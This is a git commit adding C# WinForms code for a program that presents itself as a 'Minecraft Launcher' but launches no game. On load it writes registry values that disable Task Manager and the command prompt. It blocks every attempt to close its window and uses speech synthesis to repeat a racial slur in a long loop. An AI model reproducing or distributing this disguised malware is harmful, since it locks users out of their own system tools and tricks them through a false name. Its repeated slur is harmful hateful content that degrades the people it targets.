090de6f30ad628f9ae642bd26934e28dfd267a60
sanandreasz <62306123+guwnos@users.noreply.github.com>
2022-01-06 19:18:40 +0100

    Add files via upload

---
+++ src/Maupki.exe/Minecraft 1.8.5.Designer.cs
@@ -0,0 +1,51 @@
+﻿namespace Maupki.exe
+{
+    partial class Minecraft_1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.SuspendLayout();
+            // 
+            // Minecraft_1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackgroundImage = global::Maupki.exe.Properties.Resources.pobrany_plik;
+            this.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
+            this.ClientSize = new System.Drawing.Size(800, 450);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
+            this.Name = "Minecraft_1";
+            this.Text = "Minecraft Launcher";
+            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Minecraft_1_FormClosing);
+            this.Load += new System.EventHandler(this.Minecraft_1_Load);
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+    }
+}
---
+++ src/Maupki.exe/Minecraft 1.8.5.cs
@@ -0,0 +1,50 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Speech.Synthesis;
+using Microsoft.Win32;
+
+namespace Maupki.exe
+{
+    public partial class Minecraft_1 : Form
+    {
+        public Minecraft_1()
+        {
+            InitializeComponent();
+        }
+
+        private void Minecraft_1_Load(object sender, EventArgs e)
+        {
+            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
+            key.SetValue("DisableTaskMgr", "1");
+
+            try
+            {
+                RegistryKey key2 = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\System");
+                key2.SetValue("DisableCMD", "2");
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show("Jesteś Jędrzej", "Jestes Jędrzej", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+
+            SpeechSynthesizer ss = new SpeechSynthesizer();
+            for(int i = 0; i < 800; i++)
+            {
+                ss.Speak("Nigger Nigger Nigger Nigger Nigger Nigger");
+            }
+        }
+
+        private void Minecraft_1_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            e.Cancel = true;
+            MessageBox.Show("Czemu chcesz mnie zabić kochanie :(");
+        }
+    }
+}
